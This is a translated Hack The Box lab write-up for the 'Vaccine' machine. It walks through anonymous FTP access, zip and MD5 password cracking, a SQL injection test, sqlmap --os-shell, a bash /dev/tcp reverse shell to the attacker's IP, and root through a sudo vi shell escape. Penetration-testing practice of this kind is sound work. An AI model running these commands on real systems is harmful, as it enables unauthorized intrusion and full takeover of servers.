<html>
<head>
<title>Hacking the Vaccine machine— Hack the box</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑掉疫苗机器——黑掉盒子</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/hacking-the-vaccine-machine-hack-the-box-f230fef97405?source=collection_archive---------2-----------------------#2022-03-06">https://medium.com/nerd-for-tech/hacking-the-vaccine-machine-hack-the-box-f230fef97405?source=collection_archive---------2-----------------------#2022-03-06</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/ba4dd6b08b6cceb612ea176ea57f5924.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Ob4VCcxY5lM18wGT"/></div></div><figcaption class="iq ir et er es is it bd b be z dx translated">来源:www.hackthebox.eu</figcaption></figure><p id="649a" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">在本文中，我们将在“黑盒子”中黑掉疫苗机器。我想你有一个黑盒子账户。</p><h1 id="562c" class="js jt hi bd ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp bi translated">正在使用的工具:</h1><ul class=""><li id="ab15" class="kq kr hi iw b ix ks jb kt jf ku jj kv jn kw jr kx ky kz la bi translated"><a class="ae lb" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> Nmap </a></li><li id="2390" class="kq kr hi iw b ix lc jb ld jf le jj lf jn lg jr kx ky kz la bi translated"><a class="ae lb" href="https://allabouttesting.org/install-ftp-server-on-kali-linux/" rel="noopener ugc nofollow" target="_blank"> ftp </a></li><li id="8887" class="kq kr hi iw b ix lc jb ld jf le jj lf jn lg jr kx ky kz la bi translated"><a class="ae lb" href="https://www.openwall.com/john/" rel="noopener ugc nofollow" target="_blank">开膛手约翰(JTR) </a></li><li id="0c25" class="kq kr hi iw b ix lc jb ld jf le jj lf jn lg jr kx ky kz la bi translated"><a class="ae lb" href="https://sqlmap.org/" rel="noopener ugc nofollow" target="_blank"> Sqlmap </a></li><li id="e106" class="kq kr hi iw b ix lc jb ld jf le jj lf jn lg jr kx ky kz la bi translated">Netcat</li></ul><p id="c99f" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">要开始，请连接到Hack the box vpn。然后繁殖机器。让我们在机器上运行nmap扫描。nmap扫描将允许我们看到机器上运行的服务，以及是否有任何有希望的利用。</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="b11f" class="lq jt hi lm b fi lr ls l lt lu">$ nmap -sV -sC -O -F [target_ip]<br/>PORT         STATE SERVICE VERSION<br/>21/tcp open  ftp     vsftpd 3.0.3<br/>22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br/>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span></pre><p id="bfc5" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这台机器上正在运行ftp服务。结果还显示:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="fab3" class="lq jt hi lm b fi lr ls l lt lu">21/tcp open  ftp     vsftpd 3.0.3<br/>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip</span></pre><p id="f953" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们可以看到FTP服务中的错误配置。所以任何匿名的ftp登录都是允许的！这很好，因为现在我们可以简单地连接到FTP服务。我们现在将通过找到正确的用户名，然后不输入密码来尝试暴力登录。</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="b660" class="lq jt hi lm b fi lr ls l lt lu">A list of common usernames:<br/>root<br/>admin<br/>Administrator<br/>Anonymous<br/>user</span></pre><p id="08b4" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">连接到FTP服务的命令:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="ca53" class="lq jt hi lm b fi lr ls l lt lu">ftp [target_ip] [port]</span></pre><p id="9482" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们可以看到，如果我们输入姓名匿名，那么我们不需要输入密码！</p><figure class="lh li lj lk fd ij er es paragraph-image"><div class="er es lv"><img src="../Images/cca40857cb9cc263f5a5cc5c394243ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/1*9SSnpESKd9NOx0pr7RKr7Q.png"/></div></figure><p id="b05d" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">让我们列出该目录中的所有文件:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="825d" class="lq jt hi lm b fi lr ls l lt lu">ftp&gt; ls -la<br/>drwxr-xr-x    2 0        0            4096 Apr 13  2021 .<br/>drwxr-xr-x    2 0        0            4096 Apr 13  2021 ..<br/>-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip</span></pre><p id="6afa" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">有一个有趣的文件叫做backup.zip。让我们下载它，看看它包含了什么。要下载此文件:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="c544" class="lq jt hi lm b fi lr ls l lt lu">get backup.zip</span></pre><p id="7ee4" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">键入以下命令退出连接:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="3c02" class="lq jt hi lm b fi lr ls l lt lu">exit</span></pre><p id="b6ba" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">让我们试着解压这个zip文件。</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es lw"><img src="../Images/2b421430bcb415acf51494a529c69c00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IX9j1fUnNARTd1yZtmW1NA.png"/></div></div></figure><p id="84e8" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">看起来我们需要一个密码。幸运的是，我们可以使用一个叫做开膛手约翰的工具来破解这个受密码保护的zip文件。首先，我们将使用zip2john生成一个散列。</p><blockquote class="lx ly lz"><p id="54a9" class="iu iv ma iw b ix iy iz ja jb jc jd je mb jg jh ji mc jk jl jm md jo jp jq jr hb bi translated">哈希值<strong class="iw hj">是对应于文件</strong>内容的唯一值。哈希不是通过文件名、扩展名或其他名称来标识文件的内容，而是为文件的内容分配一个唯一的值。<br/> -docs.microsoft.com</p></blockquote><p id="9fea" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">在您的终端中运行:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="305b" class="lq jt hi lm b fi lr ls l lt lu">zip2john backup.zip &gt; hack.txt</span></pre><p id="30d9" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这将创建散列并将其保存在一个名为hack.txt的文件中。现在我们需要破解这个散列来获得密码。我们会用开膛手约翰。在您的终端中键入:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="9797" class="lq jt hi lm b fi lr ls l lt lu">john hack.txt --show</span></pre><p id="f725" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">结果:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="ebfe" class="lq jt hi lm b fi lr ls l lt lu">backup.zip:741852963::backup.zip:style.css, index.php:backup.zip</span></pre><p id="62df" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这里显示的密码是“741852963”，让我们键入它。让我们输入密码，然后提取出来。我们将检查index.php的内容。</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es me"><img src="../Images/11c43073d6d1bca8f83bd7ae29fc7061.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vx3mVKJP1K2oh6vABTtipg.png"/></div></div></figure><p id="385b" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们可以看到用户名和密码已经存在。但是，密码已被转换为MD5哈希值，如下所示:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="5baa" class="lq jt hi lm b fi lr ls l lt lu">md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"</span></pre><p id="cd8f" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">MD5是一种散列函数。我们可以使用<a class="ae lb" href="https://md5.gromweb.com/" rel="noopener ugc nofollow" target="_blank">https://md5.gromweb.com/</a>来反转这个散列函数。让我们看看结果:</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mf"><img src="../Images/cb541c60db5772f602932cecc04abd67.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uMMVbekEODY7dhyUZ7o3gg.png"/></div></div></figure><p id="25c2" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">所以密码是qwerty789。让我们试着登录网站。</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mg"><img src="../Images/079f8cc2dab97ced72121f9b6dfca04c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EEH-olFG6072FTx4UK7Fuw.png"/></div></div></figure><p id="8652" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们可以看到网站是素颜的。但是有一个搜索栏。如果我们输入随机的东西，然后按回车键，那么什么都不会显示。然而，如果搜索栏是空的，我们仍然点击搜索按钮，那么整个表将再次显示。让我们检查一下它是否容易受到SQL注入的攻击。我们将在搜索框中键入以下内容:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="c103" class="lq jt hi lm b fi lr ls l lt lu">';--[Replace this with any random text]</span></pre><p id="7317" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这将转换为:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="98b2" class="lq jt hi lm b fi lr ls l lt lu">SELECT * FROM cars WHERE name ilike '<strong class="lm hj"><em class="ma">';--[RANDOM TEXT THAT WE PUT IN SEARCH]</em></strong></span></pre><p id="51eb" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">斜体部分是我们的搜索查询。我们首先关闭了引号，以防止任何内容被搜索到，我们使用“；”关闭了该命令，因为每个SQL查询都以“；”结尾。然后我们用“- -”表示这之后的任何东西都是注释。它不是代码，也不会被视为命令。基本上，我们什么也没有寻找。预期的结果应该是再次显示整个表。如果没有显示出来，那么它可能不容易受到SQL注入的攻击。</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mh"><img src="../Images/7a5f5eac817b0a565e53409c2c829e94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ppJMQm6BTB4L-hd9AjPlSw.png"/></div></div></figure><p id="d88a" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们的查询成功了！这证明了网站容易受到sql注入的攻击。正常的网站可能会显示错误信息。我们可以使用sqlmap工具，尝试看看是否可以通过sql注入来执行命令。这意味着检查我们是否可以在服务器上运行操作系统命令。使用命令</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="ddf8" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">&gt; </strong>sqlmap -u "<a class="ae lb" href="http://10.129.161.91/dashboard.php?search=" rel="noopener ugc nofollow" target="_blank">http://[IP OF TARGET]/dashboard.php?search=</a>Elixir" -p search --os-shell --cookie 'PHPSESSID=Replace_this_text_with_the_value_for_PHPSESSID'</span></pre><p id="dce0" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">-u参数指定文本的URL。我们添加“search=”是因为当我们在网站上搜索任何内容时，所有内容都会被添加到“search=”参数中。仔细观察上图中的地址栏。“— os-shell”将检查我们是否可以执行命令。我们还需要添加我们的cookie信息，因为如果我们尝试不添加它，sqlmap将被重定向到登录页面。要获得Firefox上的cookie信息，只需右键单击，然后按inspect elements。转到存储选项卡，您将在那里找到您的cookies:</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mh"><img src="../Images/21d6f34793c11836755dda83335f099d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*7Faz1QHiViDpNaiLkjwRaQ.gif"/></div></div></figure><p id="19ef" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">让我们运行这个命令。他们可能会问这些提示。照我输入的那样输入。</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mi"><img src="../Images/006e6f23b1493a0eece0ba94aeaa3b2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qhAaRqzIBbA4VBkuTY23_g.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx translated">因为我们有了数据库管理系统。</figcaption></figure><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mj"><img src="../Images/6272a324ba20aef9e5aa8b70de44fd16.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3s-22b4mN4HEk3V8L9Bmag.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx translated">这个也是Y。</figcaption></figure><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mk"><img src="../Images/070116a084fe467427fc1c2ebe80acd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sbnMeHNpyPkWzU_X4eEePg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx translated">根据我们的测试，我们知道“search”参数是易受攻击的，所以没有必要搜索其他任何东西。</figcaption></figure><p id="b620" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">结果:</p><figure class="lh li lj lk fd ij er es paragraph-image"><div class="er es ml"><img src="../Images/4c6c7fc225415866f7670717059e130a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*AxlQwpvTeFpUq2YGVQ17Qw.png"/></div></figure><p id="1f95" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们走吧！现在，我们可以在数据库管理系统中运行操作系统命令。现在我们不能用这个shell做太多事情，所以让我们用netcat获得一个反向连接。首先在您的主机中打开一个新的终端，并键入:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="ffdb" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">&gt; </strong>nc -lvnp 3000</span></pre><p id="6b46" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这将侦听任何ip地址和端口号为3000的传入连接。在sqlmap操作系统外壳中，键入:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="be4f" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">os-shell&gt;</strong> bash -c 'bash -i &gt;&amp; /dev/tcp/[YOUR IP]/3000 0&gt;&amp;1'</span></pre><p id="9dce" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">确保使用VPN给您的ip地址。在您的主机上运行ifconfig。然后选择仅在连接到HTB vpn时出现的ip地址。按回车键，当它询问时输入“y”。回到您的主机，现在您应该看到最终会出现以下内容:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="075c" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">postgres@vaccine:/var/lib/postgresql/11/main$ </strong></span></pre><p id="40f9" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们有反向连接！目前，我们的反向连接是一个“哑”壳。让我们把它升级到一个交互式的shell，这样我们就可以清空我们的屏幕，做其他你可以在普通终端上做的事情。在终端中输入以下内容:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="030e" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">postgres@vaccine:/var/lib/postgresql/11/main$ </strong>python3 -c 'import pty;pty.spawn("/bin/bash")'</span></pre><p id="96ec" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">然后按Ctrl+Z键将此反向连接置于后台。之后，在终端中输入以下命令:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="b08b" class="lq jt hi lm b fi lr ls l lt lu">stty raw -echo; fg</span></pre><p id="cc23" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">“；”允许我们在同一行上运行多个命令。使用stty raw -echo，命令后的输入看起来很奇怪，这就是为什么我们将立即执行第二个命令。“fg”将恢复我们之前在后台创建的反向连接。在终端中键入以下内容后:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="4657" class="lq jt hi lm b fi lr ls l lt lu">export TERM=xterm</span></pre><p id="2fcc" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">(注意:如果您的终端在fg后看起来很奇怪，请不要担心。一旦你退出了这个反向连接。输入“reset”使你的终端恢复正常。)</p><p id="0fb9" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">现在我们有了一个合适的tty外壳。要测试这一点，只需点击clear命令，它应该会清除屏幕。</p><p id="061d" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">搜索用户标志的时间到了。在终端中键入以下内容:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="d55c" class="lq jt hi lm b fi lr ls l lt lu">find / -name "user.txt" 2&gt;/dev/null</span></pre><p id="ff07" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这将在目标系统中查找文件，搜索文件“user.txt”。2&gt;/dev/null防止显示负面结果。结果:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="00b2" class="lq jt hi lm b fi lr ls l lt lu">/var/lib/postgresql/user.txt</span></pre><p id="2a83" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">类型:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="2301" class="lq jt hi lm b fi lr ls l lt lu">cat /var/lib/postgresql/user.txt</span></pre><p id="df2b" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">您将看到用户标志。现在是时候寻找根旗了。但在此之前，我们需要找到root用户的密码。我们将不得不这样做，手动检查每个文件。/var/www/html通常是包含网站文件的文件夹。我们去看看。</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="89bf" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">postgres@vaccine:/var/www$ </strong>cd /var/www/html<br/><strong class="lm hj">postgres@vaccine:/var/www$ </strong>ls<br/><strong class="lm hj">bg.png        dashboard.js   </strong>index.php    style.css<br/><strong class="lm hj">dashboard.css </strong> <strong class="lm hj">dashboard.php </strong> <strong class="lm hj">license.txt</strong></span></pre><p id="b6e9" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">有底气的五档都是新的。让我们首先检查dashboard.php:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="d5e0" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">postgres@vaccine:/var/www$ </strong>cat dashboard.php</span></pre><p id="02e0" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">当您向下滚动文件时，您会看到:</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mh"><img src="../Images/cd0f743acef859b5d14e0978f22480b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_ewJpTq6ujLyOu1FhrXEYQ.png"/></div></div></figure><p id="7d6e" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们有密码了！就是:“P@s5w0rd！”</p><p id="9170" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">请注意，如果连接现在意外关闭，我们不必担心，因为我们现在可以简单地通过ssh进入系统，因为我们有一个密码，并且计算机上的一个ssh端口也是打开的。在命令提示符下键入以下内容:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="bc94" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">$</strong>ssh postgres@[Target_IP]</span></pre><p id="eb64" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">然后，当它要求时，输入密码。请注意，您将看不到正在键入的密码，但可以肯定它正在被输入。您应该会看到类似这样的输出:</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mh"><img src="../Images/ca0cde20388d1de00f80a895d8383ef3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q5hVcLpNFk23vREJKDlf5g.png"/></div></div></figure><p id="c7ae" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">让我们看看作为这个用户我们可以运行什么。</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="ac34" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">postgres@vaccine:~$</strong> sudo -l<br/>Matching Defaults entries for postgres on vaccine:<br/>    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",<br/>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass</span><span id="fef8" class="lq jt hi lm b fi mm ls l lt lu">User postgres may run the following commands on vaccine:<br/>    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span></pre><p id="484c" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">所以我们可以运行这个命令:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="8ef2" class="lq jt hi lm b fi lr ls l lt lu">/bin/vi /etc/postgresql/11/main/pg_hba.conf</span></pre><p id="9cc4" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">作为当前用户。Vi是为unix系统提供的一个旧的文本编辑器。根据<a class="ae lb" href="https://gtfobins.github.io/gtfobins/vi/#sudo" rel="noopener ugc nofollow" target="_blank"> gtfobins.github.io </a>的说法，有一种方法可以作为根用户滥用这个来获得一个shell。首先，让我们运行这个命令，并在询问时输入我们之前找到的postgres密码。</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mh"><img src="../Images/e471c0c4a3d10aaa109fe601ba9f946b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sXxm4eKXpbmvthWjtP2skQ.png"/></div></div></figure><p id="e666" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">它会打开这样一个文件。现在只需运行这些命令。无论您键入什么，都应该显示在底部:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="ecbd" class="lq jt hi lm b fi lr ls l lt lu">:set shell=/bin/sh<br/>:shell</span></pre><p id="5119" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">输出:</p><figure class="lh li lj lk fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mn"><img src="../Images/439eb13103738dad16484812eeeefb33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l3LX0aOdQ-NDSXbS1fZW7A.png"/></div></div></figure><p id="8dde" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">类型:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="a8bc" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj"># </strong>whoami<br/>root<br/><strong class="lm hj"># </strong>id<br/>uid=0(root) gid=0(root) groups=0(root)</span></pre><p id="ad9e" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们现在是根用户了！让我们搜索根标志:</p><pre class="lh li lj lk fd ll lm ln lo aw lp bi"><span id="9043" class="lq jt hi lm b fi lr ls l lt lu"><strong class="lm hj">#</strong> find / -name root.txt 2&gt;/dev/null<br/>/root/root.txt<br/><strong class="lm hj">#</strong> cat /root/root.txt</span></pre><p id="ec2b" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们有根旗！</p><p id="cbbb" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这就是本文的全部内容。我希望你喜欢它。如果你有，那么请鼓掌并分享给所有其他可能发现这有用的人。感谢阅读！</p></div></div>    
</body>
</html>